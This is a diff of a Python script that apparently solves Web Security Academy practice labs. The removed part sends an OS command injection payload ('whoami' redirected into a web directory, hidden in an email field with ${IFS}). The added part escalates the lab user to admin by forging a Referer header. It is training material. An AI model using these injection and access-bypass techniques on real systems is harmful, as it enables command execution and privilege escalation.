@@ -5,47 +5,40 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from bs4 import BeautifulSoup
 
-url = 'https://0aa600da03273e0b8096b7b000ff0037.web-security-academy.net'
+url = 'https://0ad200e003f133c9837cce8900e60071.web-security-academy.net'
 
-# session = requests.Session()
+data = {
+    'username': 'wiener',
+    'password': 'peter'
+}
 
-res = requests.get(
-    url + '/feedback',
+response = requests.post(
+    url + '/login',
+    data=data,
     verify=False,
+    allow_redirects=False
 )
 
-soup = BeautifulSoup(res.text, 'html.parser')
-session = res.cookies.get('session')
-csrf_token = soup.find('input', {'name': 'csrf'})['value']
-print("session: ", session)
-print("csrf: ", csrf_token)
+session = response.headers['set-cookie'].split(';')[0].split('=')[1]
 
 cookies = {
     'session': session,
 }
 
-data = {
-    'csrf': csrf_token,
-    'name': 'cuong',
-    'email': 'abc%40gmail.com;whoami>/var/www/images/whoami${IFS}||${IFS}',
-    'subject': 'abc',
-    'message': 'abc',
+headers = {
+    'Referer': url + '/admin',
 }
 
-response = requests.post(
-    url + '/feedback/submit',
-    cookies=cookies,
-    data=data,
-    verify=False,
-)
-
 params = {
-    'filename': 'whoami'
+    'username': 'wiener',
+    'action': 'upgrade',
 }
 
 response = requests.get(
-    url + '/image',
+    url + '/admin-roles',
     params=params,
+    cookies=cookies,
+    headers=headers,
     verify=False,
 )
 
